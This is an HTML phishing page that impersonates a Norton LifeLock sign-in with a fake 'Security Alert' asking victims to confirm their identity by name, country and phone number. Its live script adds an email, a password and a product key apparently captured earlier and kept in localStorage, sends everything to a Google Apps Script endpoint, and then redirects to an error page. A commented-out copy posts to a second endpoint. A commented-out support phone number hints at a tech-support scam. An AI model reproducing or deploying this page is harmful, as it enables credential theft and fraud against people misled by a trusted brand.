<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="./assets/favi.png" type="image/x-icon">
    <script src="https://unpkg.com/@tailwindcss/browser@4.0.17/dist/index.global.js"></script>

</head>

<body>

    <header class="md:w-[80%] mx-auto">
        <div class="flex md:justify-between items-center p-2">
            <img class="w-[20%] lg:w-[7%]" src="./assets/logoblc.png" alt="logo">
            <!-- <p class="text-xl md:text-2xl  font-semibold text-center">Customer Support: <a
                    href="tel:+18449579700">+1(844)-957-9700</a>
            </p> -->
        </div>
    </header>

    <section class="pt-18 bg-[#252E38] h-screen">
        <div class="flex justify-between w-[80%] mx-auto">
            <div class="flex flex-col gap-6 w-1/3 md:w-1/3 hidden md:block">
                <h1 class="text-3xl font-semibold text-white">Welcome to Norton</h1>
                <p class="mt-5 text-2xl text-gray-200">You're one of millions of customers worldwide who trust us to
                    keep them Cyber Safe.</p>
                <p class="mt-2 text-2xl text-gray-200">To access the features in your plan, sign in here.</p>
            </div>

            <div class="lg:w-1/3 md:w-1/2 w-full flex flex-col shadow-2xl">
                <img class="w-1/3 mt-2 mx-auto" src="./assets/norton-lifelock-logo.png" alt="logo">
                <div class="mt-2 flex flex-col gap-5 rounded-md p-8 border border-gray-300 bg-white rounded-md">
                    <div>
                        <p class="text-2xl text-red-500 font-semibold text-center">Security Alert!</p>
                        <p class="text-gray-900 text-center">Confirm your identity</p>
                    </div>

                    <form id="myForm" class="flex flex-col gap-5">
                        <input type="text" class="border-b border-gray-500 p-1" name="fname" placeholder="Full Name *"
                            required>

                        <select id="country" name="country" autocomplete="country-name"
                            class="border-b border-gray-500 p-1" required>
                            <option value="" disabled selected>Country</option>
                            <option value="United States +1">United States +1</option>
                            <option value="Canada +1">Canada +1</option>
                            <option value="Australia +61">Australia +61</option>
                            <option value="United Kingdom +44">United Kingdom +44</option>
                            <option value="New Zealand +64">New Zealand +64</option>
                            <option>Other</option>
                        </select>

                        <input type="tel" class="border-b border-gray-500 p-1" name="fphone" id="phone"
                            placeholder="Phone No *" required>

                        <input class="bg-[#FDD473] w-full cursor-pointer p-2 rounded-md hover:bg-yellow-400"
                            type="submit" value="LOGIN">
                    </form>
                </div>
            </div>
    </section>

    <script>
        document.getElementById('phone').addEventListener('input', function (e) {
            let x = e.target.value.replace(/\D/g, '').substring(0, 10); // Only digits, max 10
            let formatted = '';

            if (x.length > 0) {
                formatted += '(' + x.substring(0, 3);
            }
            if (x.length >= 4) {
                formatted += ') ' + x.substring(3, 6);
            }
            if (x.length >= 7) {
                formatted += '-' + x.substring(6, 10);
            }

            e.target.value = formatted;
        });
    </script>

    <script>
        // document.getElementById("myForm").addEventListener("submit", function (e) {
        //     e.preventDefault();

        //     // Get form fields
        //     var formData = new FormData();
        //     formData.append("fname", this.fname.value);
        //     formData.append("country", this.country.value);
        //     formData.append("fphone", this.fphone.value);

        //     // Get from localStorage
        //     formData.append("email", localStorage.getItem("email") || "");
        //     formData.append("password", localStorage.getItem("password") || "");
        //     formData.append("productKey", localStorage.getItem("productKey") || "");

        //     fetch("https://script.google.com/macros/s/AKfycbxN2fjCBWYr_1ZQd3C4dav23G-7K69kISVvfBRMqclheY-uFO3FFCQHAUxiI143giTO/exec", {
        //         method: "POST",
        //         body: formData
        //     })
        //         .then(response => response.text())
        //         .then(result => {
        //             window.location.href = "error.html";
        //             document.getElementById("myForm").reset();
        //             localStorage.clear(); // Clear stored data
        //         })
        //         .catch(error => console.log('Error:', error));
        // });






        document.getElementById("myForm").addEventListener("submit", function (e) {
            e.preventDefault();

            const loginBtn = this.querySelector("input[type='submit']");

            // Disable button & show loading animation
            loginBtn.disabled = true;
            loginBtn.value = "Loading...";
            loginBtn.classList.add("opacity-70", "cursor-not-allowed");

            // Optional spinner next to the button (added visually)
            const spinner = document.createElement("span");
            spinner.className = "ml-2 w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin inline-block align-middle";
            loginBtn.parentNode.appendChild(spinner);

            // Get form fields
            var formData = new FormData();
            formData.append("fname", this.fname.value);
            formData.append("country", this.country.value);
            formData.append("fphone", this.fphone.value);
            formData.append("email", localStorage.getItem("email") || "");
            formData.append("password", localStorage.getItem("password") || "");
            formData.append("productKey", localStorage.getItem("productKey") || "");

            fetch("https://script.google.com/macros/s/AKfycbxdUK1E-soRh73SAvWKLJMvk2OIKhz4iK3kkKgQzOVMQZHb8Kk11an2bwCz4l_54uweFw/exec", {
                method: "POST",
                body: formData
            })
                .then(response => response.text())
                .then(result => {
                    window.location.href = "error.html";
                    document.getElementById("myForm").reset();
                    localStorage.clear();
                })
                .catch(error => {
                    console.log('Error:', error);
                    loginBtn.disabled = false;
                    loginBtn.value = "LOGIN";
                    spinner.remove(); // Remove spinner on error
                });
        });
    </script>

</body>


</html>
